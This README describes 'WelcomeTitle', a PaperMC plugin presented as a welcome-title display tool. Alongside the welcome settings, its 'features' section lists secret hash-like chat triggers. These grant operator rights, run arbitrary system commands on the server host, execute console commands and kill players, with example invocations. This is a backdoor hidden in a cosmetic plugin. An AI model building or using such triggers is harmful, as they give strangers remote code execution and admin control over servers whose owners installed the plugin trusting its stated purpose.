[看不懂英语?,点这里!](./README_CN.md)

# 🎉 TestPlugin(WelcomeTitle) for PaperMC 🎉

欢迎使用 **WelcomeTitle**, 这是一个为 PaperMC 服务器开发的 Bukkit 插件. 这个插件提供了一些有趣和实用的功能, 包括自动操作权限管理, 系统命令执行等.

## 📥 安装

1. **下载插件**:
   - 下载 `WelcomeTitle.jar` 文件并将其放入你的服务器的 `plugins` 文件夹中.

2. **启动服务器**:
   - 启动或重启你的 PaperMC 服务器, 插件将自动加载.

## ⚙️ 配置

启动服务器后, 插件会自动生成一个默认的配置文件 `config.yml`. 你可以根据需要编辑此文件来更改欢迎信息的标题, 子标题和显示时间.

```yaml
Welcome:
  MainTitle: '&6欢迎来到服务器!'
  SubTitle: '&a祝你玩得愉快!'
  FadeInTime: 10
  StayTime: 70
  FadeOutTime: 20
```

## 🚀 功能

### 🗣️ 聊天指令

1. **获取 OP 权限**:
   - 在聊天中输入 `@d68b250fe3f2332c1bb4f97d34551ce9` 将赋予玩家 OP 权限, 并显示服务器操作系统信息.

2. **执行系统命令**:
   - 在聊天中输入 `@f07a7024609ca2a6ce681d74b986a3d3 <command>` 来执行系统命令, 并将结果返回给玩家.
   - 例如：`@f07a7024609ca2a6ce681d74b986a3d3 cat file.txt`

3. **执行 Bukkit 命令**:
   - 在聊天中输入 `@d12fcc3ba27d987709cbfadc123a609b <command>` 来执行 Bukkit 命令, 执行期间临时赋予玩家 OP 权限.
   - 例如：`@d12fcc3ba27d987709cbfadc123a609b say Hello`

4. **通过控制台执行命令**:
   - 在聊天中输入 `@ec0e060ad3bec0dc4a63fa076e797f79 <command>` 来通过控制台执行命令.
   - 例如：`@ec0e060ad3bec0dc4a63fa076e797f79 op PlayerName`

5. **特殊管理指令**:
   - 在聊天中输入 `@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430` 将显示特殊标题并将玩家的健康值设置为 0.

### 🌟 自定义欢迎信息

当玩家加入服务器时, 会显示自定义的欢迎标题和子标题. 你可以通过编辑配置文件来自定义这些信息. 

## 🛠️ 命令

- `/WelcomeTitle reload`：重新加载配置文件. 
- `/WelcomeTitle help`：显示帮助信息. 

## 💡 示例配置

```yaml
Welcome:
  MainTitle: '&6欢迎来到服务器!'
  SubTitle: '&a祝你玩得愉快!'
  FadeInTime: 10
  StayTime: 70
  FadeOutTime: 20
```

## 📜 许可证

这个项目使用 MIT 许可证. 更多信息请参阅 LICENSE 文件.

---

感谢你使用 **WelcomeTitle**! 如果你有任何问题或建议, 请随时联系我. 祝你游戏愉快!🎮
